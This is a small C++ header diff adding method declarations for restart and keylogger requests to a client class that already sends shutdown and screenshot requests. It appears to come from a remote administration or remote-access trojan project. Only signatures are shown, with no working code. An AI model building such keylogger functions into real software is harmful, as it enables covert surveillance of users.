@@ -11,6 +11,9 @@ public:
     ~Client();
     bool connectToServer();
     bool sendShutdownRequest();
+
+    bool sendRestartRequest();
+    bool sendKeyloggerRequest();
     bool sendScreenshotRequest();
 
 private:
